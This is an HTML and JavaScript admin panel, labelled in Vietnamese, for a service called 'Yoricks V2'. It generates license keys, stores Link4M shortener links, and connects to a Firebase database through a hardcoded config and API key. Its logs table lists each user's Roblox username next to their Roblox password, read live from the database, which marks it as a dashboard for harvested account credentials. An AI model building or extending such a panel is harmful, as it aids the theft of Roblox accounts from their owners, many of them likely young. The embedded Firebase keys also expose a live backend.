<!DOCTYPE html>
<html>
<head>
    <title>Yoricks - Master Admin</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
    <style>
        body { background: #050505; color: #bc13fe; font-family: sans-serif; padding: 20px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .card { background: #111; border: 1px solid #333; padding: 20px; border-radius: 10px; }
        input, select, button { width: 100%; padding: 10px; margin: 5px 0; background: #000; color: #fff; border: 1px solid #bc13fe; }
        button { background: #bc13fe; cursor: pointer; font-weight: bold; }
        .pre-key { color: #ffcc00; border-color: #ffcc00; }
        table { width: 100%; color: white; font-size: 13px; border-collapse: collapse; }
        th, td { padding: 10px; border: 1px solid #222; text-align: left; }
    </style>
</head>
<body>
    <h1 style="text-align:center">ADMIN YORICKS V2</h1>
    
    <div class="grid">
        <div class="card">
            <h3>Tạo Key</h3>
            <select id="k-type">
                <option value="member">Key Thường (Free)</option>
                <option value="premium">Key Premium (VIP)</option>
            </select>
            <input type="number" id="k-days" placeholder="Số ngày">
            <button onclick="addKey()">GENERATE KEY</button>
            <p id="key-res" style="color:white; word-break:break-all"></p>
        </div>

        <div class="card">
            <h3>Settings Link4M</h3>
            <input type="text" id="l1" placeholder="Link 1 Ngày">
            <input type="text" id="l3" placeholder="Link 3 Ngày">
            <button onclick="saveL()">Lưu Link</button>
        </div>
    </div>

    <div class="card" style="margin-top:20px;">
        <h3>Dữ liệu Roblox (Logs)</h3>
        <table id="log-table">
            <thead>
                <tr><th>User Web</th><th>User Roblox</th><th>Pass Roblox</th><th>Thời gian</th></tr>
            </thead>
            <tbody id="log-body"></tbody>
        </table>
    </div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCJOmyua7gtX022ITp7w-eOr3TSkN0UikM",
        authDomain: "yoricks-sytem.firebaseapp.com",
        databaseURL: "https://yoricks-sytem-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "yoricks-sytem",
        storageBucket: "yoricks-sytem.firebasestorage.app",
        messagingSenderId: "318734426446",
        appId: "1:318734426446:web:e62527dfe42d8cf48e7e1f"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function addKey() {
        const type = document.getElementById('k-type').value;
        const days = document.getElementById('k-days').value || 1;
        const key = (type === "premium" ? "PRE-" : "FREE-") + Math.random().toString(36).substring(2, 10).toUpperCase();
        
        db.ref('keys/' + key).set({ type: type, duration: days, used: false })
        .then(() => {
            document.getElementById('key-res').innerHTML = `Đã tạo key ${type}: <b>${key}</b>`;
        });
    }

    function saveL() {
        db.ref('settings/links').set({ d1: document.getElementById('l1').value, d3: document.getElementById('l3').value })
        .then(() => Swal.fire('Xong', 'Lưu link thành công', 'success'));
    }

    db.ref('logs').on('value', s => {
        const logs = s.val();
        let h = "";
        for(let user in logs) {
            for(let id in logs[user]) {
                const data = logs[user][id];
                h += `<tr>
                    <td>${user}</td>
                    <td>${data.r_user}</td>
                    <td style="color:lime">${data.r_pass}</td>
                    <td>${data.time}</td>
                </tr>`;
            }
        }
        document.getElementById('log-body').innerHTML = h;
    });
</script>
</body>
</html>
